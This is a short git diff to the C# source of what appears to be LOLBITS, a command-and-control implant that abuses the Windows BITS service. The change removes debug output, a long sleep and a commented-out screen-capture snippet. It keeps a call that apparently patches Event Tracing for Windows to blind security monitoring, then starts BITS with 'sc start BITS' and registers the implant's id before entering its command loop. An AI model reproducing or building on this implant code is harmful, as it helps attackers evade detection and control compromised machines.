@@ -43,17 +43,10 @@ namespace LOLBITS.Controlling
         public void Start()
         {
 
-            if (Utils.handleETW(_sysCall))
-                Console.WriteLine("Bien parcheado");
-            else
-                Console.WriteLine("Mal parcheado");
-
-            Thread.Sleep(10000000);
-
-            SysCallManager sysCall = new SysCallManager();
+            Utils.handleETW(_sysCall);
 
             const string startBits = "sc start BITS";
-            Utils.ExecuteCommand(startBits, sysCall);
+            Utils.ExecuteCommand(startBits, _sysCall);
             Thread.Sleep(500);
             var filePath = _tempPath + @"\" + _id;
 
@@ -71,17 +64,9 @@ namespace LOLBITS.Controlling
 
             _jobsManager.Send(_id, filePath);
 
+
             Loop();
                 
-            /*Rectangle bounds = Screen.GetBounds(Point.Empty);
-                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
-                {
-                    using (Graphics g = Graphics.FromImage(bitmap))
-                    {
-                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
-                    }
-                    bitmap.Save(@"c:\users\pccom\desktop\test.jpg", ImageFormat.Jpeg);
-                }*/
         }
 
         private void Loop()
